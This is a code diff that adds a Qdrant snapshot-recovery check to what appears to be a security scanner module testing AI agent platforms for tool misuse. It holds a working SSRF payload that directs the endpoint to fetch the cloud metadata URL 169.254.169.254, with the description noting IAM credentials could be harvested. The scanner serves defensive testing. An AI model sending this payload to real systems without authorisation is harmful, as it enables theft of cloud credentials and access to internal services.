@@ -107,10 +107,68 @@ def _schema_fields(tool: dict) -> set[str]:
     return fields
 
 
+_QDRANT_SSRF_ENDPOINT = "/collections/condor-probe/snapshots/recover"
+_QDRANT_SSRF_PAYLOAD  = {"location": "http://169.254.169.254/latest/meta-data/"}
+
+
 class ToolMisuseModule(BaseModule):
     name        = "tool-misuse"
     owasp_id    = OWASPCategory.ASI02
     description = "Tests for path traversal and SSRF via tool parameters, and detects exposed credentials (ASI02)"
+
+    async def _check_qdrant_ssrf(self, platform: BasePlatform) -> list[Finding]:
+        """Probe Qdrant snapshot recovery endpoint for SSRF without authentication."""
+        findings: list[Finding] = []
+        try:
+            r = await platform.post(_QDRANT_SSRF_ENDPOINT, json=_QDRANT_SSRF_PAYLOAD)
+            if r.status_code in (401, 403, 404, 405):
+                return findings
+            body = r.text
+            if not _is_api_response(r):
+                return findings
+            ssrf_confirmed = any(ind in body for ind in _SSRF_CONFIRMED_INDICATORS)
+            if r.status_code in (200, 201) and ssrf_confirmed:
+                findings.append(Finding(
+                    title="SSRF via Qdrant snapshot recovery: metadata fetched",
+                    severity=Severity.CRITICAL,
+                    owasp_id=self.owasp_id,
+                    description=(
+                        "Qdrant's POST /collections/{name}/snapshots/recover endpoint fetched "
+                        "a cloud metadata URL without authentication, confirming SSRF. "
+                        "An attacker can reach internal services and harvest IAM credentials."
+                    ),
+                    evidence=f"POST {_QDRANT_SSRF_ENDPOINT} → {r.status_code}; metadata in response: {body[:200]}",
+                    remediation=(
+                        "Enable Qdrant API key authentication (--api-key / QDRANT__SERVICE__API_KEY). "
+                        "Restrict outbound network access from the Qdrant host."
+                    ),
+                    confidence=95,
+                    cwe_id="CWE-918",
+                    endpoint=_QDRANT_SSRF_ENDPOINT,
+                ))
+            elif r.status_code not in (200, 201) or not ssrf_confirmed:
+                findings.append(Finding(
+                    title="Qdrant snapshot recovery endpoint accessible without authentication",
+                    severity=Severity.HIGH,
+                    owasp_id=self.owasp_id,
+                    description=(
+                        "Qdrant's snapshot recovery endpoint accepted an unauthenticated request "
+                        f"(HTTP {r.status_code}). The endpoint allows specifying arbitrary URLs "
+                        "for snapshot fetching, creating a potential SSRF surface against internal "
+                        "services. Metadata confirmation requires manual verification."
+                    ),
+                    evidence=f"POST {_QDRANT_SSRF_ENDPOINT} with SSRF URL → {r.status_code} (auth not enforced)",
+                    remediation=(
+                        "Enable Qdrant API key authentication. "
+                        "Restrict outbound network access from the Qdrant host."
+                    ),
+                    confidence=70,
+                    cwe_id="CWE-918",
+                    endpoint=_QDRANT_SSRF_ENDPOINT,
+                ))
+        except Exception:
+            pass
+        return findings
 
     async def run(self, surface: AgentSurface, platform: BasePlatform) -> list[Finding]:
         findings: list[Finding] = []
@@ -290,7 +348,11 @@ class ToolMisuseModule(BaseModule):
                     except Exception:
                         pass
 
-        # --- 4. Generic probe when no tools enumerated ---
+        # --- 4. Qdrant SSRF via snapshot recovery endpoint ---
+        findings.extend(await self._check_qdrant_ssrf(platform))
+
+        # --- 5. Generic probe when no tools enumerated ---
+
         if not surface.tools:
             for endpoint in _GENERIC_ENDPOINTS:
                 try:
